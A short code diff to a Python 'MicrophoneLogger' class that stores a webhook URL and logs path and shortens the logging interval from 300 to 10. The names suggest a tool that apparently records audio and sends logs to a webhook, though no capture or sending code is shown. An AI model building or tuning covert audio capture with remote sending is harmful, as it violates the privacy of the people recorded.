@@ -10,7 +10,7 @@ class MicrophoneLogger:
         self.software_dir_name = software_dir_name
         self.webhook_url = webhook_url
         self.logs_path = get_logs_path(self.software_dir_name)
-        self.interval = 300
+        self.interval = 10
 
     def log_microphone(self):
         try:
